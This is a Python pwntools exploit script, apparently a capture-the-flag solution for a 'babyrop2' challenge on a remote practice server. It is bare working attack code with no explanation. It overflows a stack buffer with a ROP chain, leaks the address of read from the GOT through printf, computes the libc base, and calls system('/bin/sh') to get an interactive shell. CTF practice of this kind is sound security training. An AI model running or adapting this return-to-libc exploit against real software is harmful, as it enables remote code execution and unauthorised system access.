from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',29207)
elf=ELF("babyrop2")
libc=ELF("libc.so.6")
rdi=0x0000000000400733
rsi_r15_ret=0x0000000000400731
printf_plt=elf.plt["printf"]
read_got=elf.got["read"]
format_str=0x0000000000400770
main_addr= elf.sym["main"]
payload=(0x20+8)*b'a'+p64(rdi)+p64(format_str)+p64(rsi_r15_ret)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)
p.sendlineafter("What's your name?",payload)
read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base=read_addr-libc.sym["read"]
system_addr=libc_base+libc.sym["system"]
bin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))
payload_=(0x20+8)*b'a'+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)
p.sendlineafter("What's your name?",payload_)
p.interactive()






